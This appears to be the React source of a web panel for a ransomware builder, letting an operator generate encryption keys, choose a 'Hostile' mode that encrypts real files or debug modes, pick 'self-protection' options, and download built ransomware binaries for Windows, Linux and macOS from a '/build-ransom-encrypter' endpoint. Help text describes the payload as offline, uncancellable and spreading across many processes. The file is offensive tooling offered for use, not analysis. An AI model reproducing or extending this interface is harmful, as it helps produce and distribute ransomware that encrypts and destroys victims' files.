import React, { useEffect, useState } from "react";
import { Layout } from "../Layout";
import md5 from "md5";

export function EncryptPage(): JSX.Element {
  const [publicKeys, setPublicKeys] = useState<string[] | undefined>(undefined);
  const [mode, setMode] = useState("streamSystemDir");
  const [selfProtection, setSelfProtection] = useState("nuke");
  const [hideHelp, setHideHelp] = useState<boolean>(
    localStorage.getItem("hide-help") === "true"
  );

  const isDestructive = (() => {
    switch (mode) {
      case "streamSystemDir":
        return true;
      case "streamTmpDir":
      case "streamFreshTmpDir":
      default:
        return false;
    }
  })();

  useEffect(() => {
    localStorage.setItem("hide-help", hideHelp.toString());
  }, [hideHelp]);

  const [confirm, setConfirm] = useState<string | undefined>(undefined);
  const color = (() => {
    switch (mode) {
      case "streamSystemDir":
        return "red";
      case "streamTmpDir":
        return "green";
      case "streamFreshTmpDir":
        return "deepskyblue";
      default:
        return "initial";
    }
  })();

  const WarningParagraph = () =>
    (() => {
      switch (mode) {
        case "streamSystemDir":
          return (
            <div
              style={{
                display: "flex",
              }}
            >
              <p style={{ color: "#000", backgroundColor: color }}>
                <b>HOSTILE MODE IS DESTRUCTIVE</b>
              </p>
            </div>
          );
        case "streamTmpDir":
          return <p style={{ color }}>Debug with cache is safe to execute</p>;
        case "streamFreshTmpDir":
          return (
            <p style={{ color }}>Debug with no cache is safe to execute</p>
          );
        default:
          return <></>;
      }
    })();

  const modeAsFilename = (() => {
    switch (mode) {
      case "streamSystemDir":
        return "hostile";
      case "streamTmpDir":
        return "debug";
      case "streamFreshTmpDir":
        return "fdebug";
      default:
        return "invalid";
    }
  })();

  useEffect(() => {
    async function fetchPublicKeys() {
      const response = await window.fetch("/keys");
      const keys: string[] = await response.json();
      setPublicKeys([...keys.reverse()]);
    }

    fetchPublicKeys();

    return () => {};
  }, []);

  function generateRansomEncrypterDownloadLink(
    publicKey: string,
    ext: string,
    mode: string
  ) {
    const params = new URLSearchParams();
    params.append("publicKey", publicKey);
    params.append("mode", mode);
    params.append("selfProtection", selfProtection);

    const extToOs: Record<string, string> = {
      ".exe": "win",
      ".deb": "linux",
      ".dmg": "macos",
    };

    if (typeof extToOs[ext] !== "string") {
      return `blank`;
    }

    params.append("os", extToOs[ext]);

    return `/build-ransom-encrypter?${params}`;
  }

  async function generateNewKey() {
    const response = await fetch("/generate-key", {
      method: "POST",
    });

    const createdKey: string = await response.json();

    setPublicKeys((publicKeys) => [createdKey, ...(publicKeys ?? [])]);
  }

  async function deleteKey(publicKey: string) {
    const params = new URLSearchParams();
    params.append("publicKey", publicKey);

    const response = await fetch(`/delete-key?${params.toString()}`, {
      method: "DELETE",
    });

    if (response.status === 202) {
      setPublicKeys((publicKeys) => publicKeys?.filter((e) => e !== publicKey));
    }
  }

  async function withConfirmation(
    fn: () => Promise<void> | (() => void),
    requestId: string
  ) {
    if (confirm === requestId) {
      await fn();
      setConfirm(undefined);
    } else {
      setConfirm(requestId);
    }
  }

  if (publicKeys === undefined) {
    return <p>Loading...</p>;
  }

  return (
    <Layout>
      <div
        style={{
          display: "flex",
          justifyContent: "center",
        }}
      >
        <label htmlFor="hide-help">Show help</label>
        <input
          type="checkbox"
          name="hide-help"
          id="hide-help"
          checked={!hideHelp}
          onChange={(e) => setHideHelp(!hideHelp)}
        />
      </div>

      <div
        style={{
          width: "100%",
        }}
      >
        <h1 style={{ textAlign: "center" }}>Encryption Binary Downloader</h1>

        {!hideHelp && (
          <>
            <p>
              <b>
                Note: when downloading for the first time it may take a while.
                Wait 1-3 minutes, server will install dependencies and build
                your ransomware.
              </b>
            </p>
            <p>And yes, I'm not a UX nerd how did you know?</p>
            <hr />
          </>
        )}

        <WarningParagraph />

        <label htmlFor="ransom-mode">
          <b>Ransomware behavior:</b>
        </label>
        <select
          onChange={(e) => {
            setMode(e.target.options[e.target.selectedIndex].value);
          }}
          name="mode"
          id="ransom-mode"
        >
          <option value="streamSystemDir">
            Hostile (Will search for real files to encrypt)
          </option>
          <option value="streamTmpDir">
            Debug with cache (Will encrypt an existing temporary directory or
            create a new one)
          </option>
          <option value="streamFreshTmpDir">
            Debug with no cache (Will always encrypt a new temporary directory)
          </option>
        </select>

        {!hideHelp && (
          <>
            {mode === "streamSystemDir" && (
              <>
                <p>
                  <b>
                    I'm not captain obvious, but I will say it: don't run the
                    ransomware binary in hostile mode on your personal machine,{" "}
                    <b>just don't.</b>
                  </b>
                </p>
                <p>
                  Or do it, it's your machine, I'm just an HTML paragraph, not a
                  cop.
                </p>
              </>
            )}
          </>
        )}

        {mode === "streamSystemDir" && (
          <>
            <hr />

            <label htmlFor="self-protection">
              <b>Self-protection settings: </b>
            </label>
            <select
              onChange={(e) => {
                setSelfProtection(
                  e.target.options[e.target.selectedIndex].value
                );
              }}
              name="self-protection"
              id="self-protection"
            >
              <option value="nuke">
                Nuke (No protection at all, if it runs, it encrypts) You've been
                warned
              </option>
              <option value="machineguid">
                Unique Machine ID (Don't execute the ransomware when the target
                machine is your machine)
              </option>
              <option value="vmonly">
                Run on VM only (Execute the ransomware only when running through
                a Virtual Machine)
              </option>
            </select>

            {!hideHelp && (
              <>
                <p style={{ color: "red" }}>
                  HOSTILE MODE{" "}
                  <b>IS MEANT TO BE RUN INSIDE OF A VM OR SANDBOX</b>, DO NOT
                  RELY ON THIS CONFIGURATION TO SECURE YOUR MACHINE.
                </p>

                <p>Be aware:</p>
                <ul>
                  <li>
                    Once clicked, there is no going back, this ransomware has no
                    "cancel" button.
                  </li>
                  <li>
                    This shit works 100% offline, so the only way to shut it
                    down is to turn off the computer or by throwing the laptop
                    against the wall (yet). If you kill the ransomware process
                    it'll just make worse because it will probably corrupt some
                    of your files.
                  </li>
                  <li>
                    It spawns multiple processes and threads and does lazy
                    encryption, so the spread rate of the infection is almost
                    synchronous, it's safer to let the ransomware encrypt
                    everything and use the key to decrypt than to try to shut
                    down and end up with your half-encrypted and consequently
                    corrupted files.
                  </li>
                </ul>
              </>
            )}
          </>
        )}

        <hr />

        <h4>Available keys:</h4>

        <button onClick={generateNewKey}>Generate new Ransomware key</button>

        {!hideHelp && (
          <>
            <p>
              These are your public keys. Keys are used to build your
              ransomware.
            </p>
          </>
        )}

        {publicKeys.length === 0 && (
          <>
            <p>
              <i style={{ textDecoration: "italic" }}>
                No keys available, keys are needed to create ransomware
                binaries.
              </i>
            </p>
          </>
        )}

        <div>
          {publicKeys!.map((publicKey) => (
            <React.Fragment key={publicKey}>
              <p>{publicKey}</p>
              <div style={{ paddingBottom: "1rem", display: "flex" }}>
                <button
                  onClick={() =>
                    withConfirmation(() => deleteKey(publicKey), publicKey)
                  }
                >
                  {confirm === publicKey ? "Confirm" : "Delete Key"}
                </button>

                {confirm === publicKey && (
                  <button onClick={() => setConfirm(undefined)}>Cancel</button>
                )}
              </div>
              {[".exe", ".deb", ".dmg"].map((ext) => {
                const generateBasicFileName = () =>
                  `${modeAsFilename}-${md5(publicKey)}` + ext;

                const generateFileNameWithSelfProtectionIncluded = () =>
                  `${modeAsFilename}-${selfProtection}-${md5(publicKey)}` + ext;

                const filename = isDestructive
                  ? generateFileNameWithSelfProtectionIncluded()
                  : generateBasicFileName();
                //
                return (
                  <li key={filename}>
                    <a
                      style={{
                        color,
                      }}
                      key={filename}
                      download={filename}
                      href={generateRansomEncrypterDownloadLink(
                        publicKey,
                        ext,
                        mode
                      )}
                    >
                      {filename}
                    </a>
                  </li>
                );
              })}
              <hr />
            </React.Fragment>
          ))}
        </div>
      </div>
    </Layout>
  );
}
